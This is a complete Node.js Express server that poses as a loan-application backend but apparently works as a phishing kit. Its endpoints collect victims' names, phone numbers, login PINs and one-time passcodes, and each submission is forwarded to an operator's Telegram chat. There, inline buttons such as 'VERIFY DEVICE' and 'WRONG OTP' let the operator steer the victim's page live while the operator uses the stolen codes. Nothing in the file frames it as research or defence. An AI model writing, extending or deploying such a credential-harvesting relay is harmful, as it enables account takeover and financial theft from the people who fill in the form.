‎
‎require('dotenv').config();
‎const express = require('express');
‎const cors = require('cors');
‎const bodyParser = require('body-parser');
‎const axios = require('axios');
‎const path = require('path');
‎
‎const app = express();
‎
‎// Middleware
‎app.use(cors());
‎app.use(bodyParser.json({ limit: '50mb' }));
‎app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
‎
‎// Serve static files from public directory
‎app.use(express.static(path.join(__dirname, 'public')));
‎
‎const PORT = process.env.PORT || 3000;
‎const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
‎const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
‎
‎// Store sessions and their statuses
‎const sessions = {};
‎
‎// Cleanup old sessions every hour
‎setInterval(() => {
‎    const oneHourAgo = Date.now() - (60 * 60 * 1000);
‎    for (const sessionId in sessions) {
‎        if (sessions[sessionId].timestamp < oneHourAgo) {
‎            delete sessions[sessionId];
‎        }
‎    }
‎}, 60000);
‎
‎// Health check
‎app.get('/health', (req, res) => {
‎    res.json({ status: 'OK', timestamp: new Date() });
‎});
‎
‎// Root route
‎app.get('/', (req, res) => {
‎    res.sendFile(path.join(__dirname, 'public', 'index.html'));
‎});
‎
‎// Submit personal information
‎app.post('/api/submit-personal-info', async (req, res) => {
‎    try {
‎        const { sessionId, firstName, lastName, phone, loanAmount, loanPurpose } = req.body;
‎
‎        if (!sessionId || !firstName || !lastName || !phone || !loanAmount || !loanPurpose) {
‎            return res.status(400).json({ success: false, message: 'Missing required fields' });
‎        }
‎
‎        // Store session data
‎        sessions[sessionId] = {
‎            stage: 'personal_info',
‎            status: 'PENDING',
‎            firstName,
‎            lastName,
‎            phone,
‎            loanAmount,
‎            loanPurpose,
‎            timestamp: Date.now()
‎        };
‎
‎        // Send to Telegram bot
‎        const message = `
‎🔔 <b>NEW LOAN APPLICATION</b>
‎
‎<b>Applicant:</b> ${firstName} ${lastName}
‎<b>Phone:</b> ${phone}
‎<b>Loan Amount:</b> P ${loanAmount.toLocaleString()}
‎<b>Purpose:</b> ${loanPurpose}
‎
‎<b>Session ID:</b> ${sessionId}
‎        `;
‎
‎        await sendTelegramMessage(message, sessionId, 'personal_info');
‎
‎        res.json({ success: true, message: 'Information submitted. Waiting for approval...' });
‎    } catch (error) {
‎        console.error('Error in submit-personal-info:', error);
‎        res.status(500).json({ success: false, message: 'Error submitting information' });
‎    }
‎});
‎
‎// Submit login
‎app.post('/api/submit-login', async (req, res) => {
‎    try {
‎        const { sessionId, phone, pin } = req.body;
‎
‎        if (!sessionId || !phone || !pin) {
‎            return res.status(400).json({ success: false, message: 'Missing required fields' });
‎        }
‎
‎        if (!sessions[sessionId]) {
‎            return res.status(400).json({ success: false, message: 'Invalid session' });
‎        }
‎
‎        sessions[sessionId].stage = 'login';
‎        sessions[sessionId].status = 'PENDING';
‎        sessions[sessionId].loginPhone = phone;
‎        sessions[sessionId].loginPin = pin;
‎
‎        const message = `
‎🔐 <b>LOGIN VERIFICATION</b>
‎
‎<b>Phone:</b> ${phone}
‎<b>PIN:</b> ${pin}
‎
‎<b>Session ID:</b> ${sessionId}
‎
‎Please verify if this login is valid.
‎        `;
‎
‎        await sendTelegramMessage(message, sessionId, 'login');
‎
‎        res.json({ success: true, message: 'Login submitted. Waiting for verification...' });
‎    } catch (error) {
‎        console.error('Error in submit-login:', error);
‎        res.status(500).json({ success: false, message: 'Error submitting login' });
‎    }
‎});
‎
‎// Submit OTP
‎app.post('/api/submit-otp', async (req, res) => {
‎    try {
‎        const { sessionId, otp } = req.body;
‎
‎        if (!sessionId || !otp) {
‎            return res.status(400).json({ success: false, message: 'Missing required fields' });
‎        }
‎
‎        if (!sessions[sessionId]) {
‎            return res.status(400).json({ success: false, message: 'Invalid session' });
‎        }
‎
‎        sessions[sessionId].stage = 'otp';
‎        sessions[sessionId].status = 'PENDING';
‎        sessions[sessionId].otp = otp;
‎
‎        const sessionData = sessions[sessionId];
‎        const message = `
‎✔️ <b>OTP VERIFICATION</b>
‎
‎<b>Phone:</b> ${sessionData.loginPhone}
‎<b>OTP Submitted:</b> ${otp}
‎
‎<b>Session ID:</b> ${sessionId}
‎
‎Please verify if the OTP is correct.
‎        `;
‎
‎        await sendTelegramMessage(message, sessionId, 'otp');
‎
‎        res.json({ success: true, message: 'OTP submitted. Waiting for verification...' });
‎    } catch (error) {
‎        console.error('Error in submit-otp:', error);
‎        res.status(500).json({ success: false, message: 'Error submitting OTP' });
‎    }
‎});
‎
‎// Check status
‎app.get('/api/check-status', (req, res) => {
‎    try {
‎        const { sessionId, stage } = req.query;
‎
‎        if (!sessionId) {
‎            return res.status(400).json({ status: 'ERROR', message: 'Missing sessionId' });
‎        }
‎
‎        if (!sessions[sessionId]) {
‎            return res.json({ status: 'UNKNOWN' });
‎        }
‎
‎        const session = sessions[sessionId];
‎        res.json({ status: session.status, data: session });
‎    } catch (error) {
‎        console.error('Error in check-status:', error);
‎        res.status(500).json({ status: 'ERROR', message: 'Error checking status' });
‎    }
‎});
‎
‎// Telegram webhook endpoint
‎app.post('/telegram-webhook', async (req, res) => {
‎    try {
‎        const update = req.body;
‎
‎        if (!update.callback_query) {
‎            return res.sendStatus(200);
‎        }
‎
‎        const callbackQuery = update.callback_query;
‎        const data = callbackQuery.data;
‎        const messageId = callbackQuery.message.message_id;
‎        const chatId = callbackQuery.from.id;
‎
‎        // Parse callback data
‎        const [action, sessionId] = data.split(':');
‎
‎        if (!sessions[sessionId]) {
‎            return res.sendStatus(200);
‎        }
‎
‎        // Update session status
‎        const statusMap = {
‎            'APPROVE': 'APPROVED',
‎            'DENY': 'DENIED',
‎            'VERIFY_DEVICE': 'VERIFY_DEVICE',
‎            'WRONG_OTP': 'WRONG_OTP',
‎            'REQUEST_OTP': 'REQUEST_OTP'
‎        };
‎
‎        sessions[sessionId].status = statusMap[action] || 'UNKNOWN';
‎
‎        // Edit the message to show the decision
‎        try {
‎            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
‎                chat_id: TELEGRAM_CHAT_ID,
‎                message_id: messageId,
‎                text: `✅ Decision: ${action}`,
‎                parse_mode: 'HTML'
‎            });
‎        } catch (e) {
‎            console.log('Message already edited or expired');
‎        }
‎
‎        res.sendStatus(200);
‎    } catch (error) {
‎        console.error('Webhook error:', error);
‎        res.sendStatus(500);
‎    }
‎});
‎
‎// Telegram bot webhook setup
‎app.get('/setup-webhook', async (req, res) => {
‎    try {
‎        const webhookUrl = process.env.WEBHOOK_URL || `https://${req.get('host')}/telegram-webhook`;
‎        
‎        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`, {
‎            url: webhookUrl
‎        });
‎
‎        res.json({ success: true, message: 'Webhook setup complete', data: response.data });
‎    } catch (error) {
‎        console.error('Webhook setup error:', error);
‎        res.status(500).json({ success: false, message: 'Webhook setup failed', error: error.message });
‎    }
‎});
‎
‎async function sendTelegramMessage(message, sessionId, stage) {
‎    const keyboard = {
‎        inline_keyboard: []
‎    };
‎
‎    if (stage === 'personal_info') {
‎        keyboard.inline_keyboard = [
‎            [
‎                { text: '✅ APPROVE', callback_data: `APPROVE:${sessionId}` },
‎                { text: '❌ DENY', callback_data: `DENY:${sessionId}` }
‎            ]
‎        ];
‎    } else if (stage === 'login') {
‎        keyboard.inline_keyboard = [
‎            [
‎                { text: '✅ APPROVE', callback_data: `APPROVE:${sessionId}` },
‎                { text: '⚠️ VERIFY DEVICE', callback_data: `VERIFY_DEVICE:${sessionId}` }
‎            ],
‎            [
‎                { text: '❌ DENY', callback_data: `DENY:${sessionId}` }
‎            ]
‎        ];
‎    } else if (stage === 'otp') {
‎        keyboard.inline_keyboard = [
‎            [
‎                { text: '✅ APPROVE', callback_data: `APPROVE:${sessionId}` },
‎                { text: '❌ WRONG OTP', callback_data: `WRONG_OTP:${sessionId}` }
‎            ]
‎        ];
‎    }
‎
‎    try {
‎        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
‎            chat_id: TELEGRAM_CHAT_ID,
‎            text: message,
‎            parse_mode: 'HTML',
‎            reply_markup: keyboard
‎        });
‎    } catch (error) {
‎        console.error('Error sending Telegram message:', error.response?.data || error.message);
‎        throw error;
‎    }
‎}
‎
‎app.listen(PORT, () => {
‎    console.log(`🚀 Server running on port ${PORT}`);
‎    console.log(`📱 Telegram webhook ready at /telegram-webhook`);
‎    console.log(`🌐 Visit http://localhost:${PORT} to access the app`);
‎});
‎
‎module.exports = app;
‎
